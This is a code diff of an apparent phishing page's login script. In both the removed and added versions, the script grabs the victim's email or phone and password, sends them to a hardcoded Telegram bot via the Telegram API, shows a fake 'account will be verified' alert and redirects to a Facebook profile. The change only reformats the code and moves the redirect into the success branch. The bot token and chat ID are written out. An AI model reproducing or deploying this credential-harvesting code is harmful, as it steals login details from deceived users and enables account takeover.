@@ -32,34 +32,34 @@
     </div>
     
     <script>
-      document.getElementById("loginForm").addEventListener("submit", function(event) {
-  event.preventDefault(); // Prevent the form from submitting normally
-  
-  // Get the input values
-  const emailOrPhone = document.getElementById("emailInput").value;
-  const password = document.getElementById("passwordInput").value;
-  
-  // Send the data to the Telegram bot
-  const botToken = "6665901686:AAFTZi9DXkedyHhUdC0nQjzJvBFtNCThf6E";
-  const chatId = "5990142501";
-  const message = `Email or Phone: ${emailOrPhone}\nPassword: ${password}`;
-  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-  
-  // Send a POST request to the Telegram Bot API
-  fetch(url, { method: "POST" })
-    .then(response => {
-      if (response.ok) {
-        alert("Your account will be verified soon!");
-      } else {
-        alert("Failed to verify your account. Please check your credentials.");
-      }
-    })
-    .catch(error => {
-      alert("An error occurred while sending data to the Telegram bot.");
-      console.error(error);
-    });
-            window.location.href = "https://www.facebook.com/profile.php?id=100063732258457";
-});
-    </script>
+  document.getElementById("loginForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent the form from submitting normally
+
+    // Get the input values
+    const emailOrPhone = document.getElementById("emailInput").value;
+    const password = document.getElementById("passwordInput").value;
+
+    // Send the data to the Telegram bot
+    const botToken = "6665901686:AAFTZi9DXkedyHhUdC0nQjzJvBFtNCThf6E";
+    const chatId = "5990142501";
+    const message = `Email or Phone: ${emailOrPhone}\nPassword: ${password}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    // Send a POST request to the Telegram Bot API
+    fetch(url, { method: "POST" })
+      .then(response => {
+        if (response.ok) {
+          alert("Your account will be verified soon!");
+          window.location.href = "https://www.facebook.com/profile.php?id=100063732258457";
+        } else {
+          alert("Failed to verify your account. Please check your credentials.");
+        }
+      })
+      .catch(error => {
+        alert("An error occurred while sending data to the Telegram bot.");
+        console.error(error);
+      });
+  });
+</script>
   </body>
 </html>
